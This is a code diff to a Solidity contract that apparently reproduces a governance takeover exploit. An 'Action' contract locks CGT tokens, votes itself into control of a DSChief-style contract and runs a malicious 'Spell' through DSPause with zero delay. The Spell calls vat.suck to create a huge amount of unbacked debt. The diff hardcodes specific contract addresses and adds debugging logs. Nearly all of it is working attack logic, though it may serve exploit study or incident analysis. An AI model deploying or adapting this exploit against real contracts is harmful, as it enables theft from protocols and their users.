@@ -15,8 +15,12 @@ contract Action {
     // The attacker knew the Chief address in advance, we pass this as a constructor argument
     constructor(address _chief, address _pause) {
         pans = msg.sender;
-        chief = IDSChief(_chief);
-        pause = DSPause(_pause);
+        // Somehow Chief and Pause in tandem receive minting privileges to CSC Token
+        chief = IDSChief(0x579A3244f38112b8AAbefcE0227555C9b6e7aaF0);
+        pause = DSPause(0x1e692eF9cF786Ed4534d5Ca11EdBa7709602c69f);
+
+        // chief = IDSChief(_chief);
+        // pause = DSPause(_pause);
     }
 
     modifier onlyPans() {
@@ -27,6 +31,8 @@ contract Action {
     function cook(address _cgt, uint256 amount, uint256 wethMin, uint256 daiMin) external onlyPans {
         IERC20 cgt = IERC20(_cgt);
         cgt.transferFrom(msg.sender, address(this), amount);
+        console.log("Balance of CGT: %s", cgt.balanceOf(address(this)));
+
         cgt.approve(address(chief), amount);
 
         chief.lock(amount);
@@ -34,7 +40,6 @@ contract Action {
         address[] memory _yays = new address[](1);
         _yays[0] = address(this);
         chief.vote(_yays);
-
         chief.lift(address(this));
 
         spell = new Spell();
@@ -48,6 +53,7 @@ contract Action {
         uint256 delay = block.timestamp + 0;
         console.log("Balance of CGT: %s", cgt.balanceOf(address(this)));
 
+        // Somehow DSPauseProxy should be allowed in the context of CSC Token to mint tokens
         pause.plot(spellAddr, tag, funcSig, delay);
         pause.exec(spellAddr, tag, funcSig, delay);
 
@@ -58,8 +64,11 @@ contract Action {
 contract Spell {
     function act(address user, IMERC20 cgt) public {
         // TODO
-        IVat vat = IVat(0x0228CBe36e99375F8dd437Eab1CceDC959Be89A3);
-        IJoin daiJoin = IJoin(0xe127C2dBA608Ada7F6d75595ac1b675294df2809);
+        // IVat vat = IVat(0x0228CBe36e99375F8dd437Eab1CceDC959Be89A3);
+        // IJoin daiJoin = IJoin(0xe127C2dBA608Ada7F6d75595ac1b675294df2809);
+
+        IVat vat = IVat(0x8B2B0c101adB9C3654B226A3273e256a74688E57);
+        IJoin daiJoin = IJoin(0xE35Fc6305984a6811BD832B0d7A2E6694e37dfaF);
 
         vat.suck(address(this), address(this), 10 ** 9 * 10 ** 18 * 10 ** 27);
 
@@ -123,8 +132,6 @@ contract Chief is IDSChief {
         require(approvals[whom] > approvals[hat]);
         hat = whom;
     }
-
-    function free(uint256 wad) external {}
 
     // Aux functions not called directly
     function etch(address[] memory yays) public returns (bytes32 slate) {
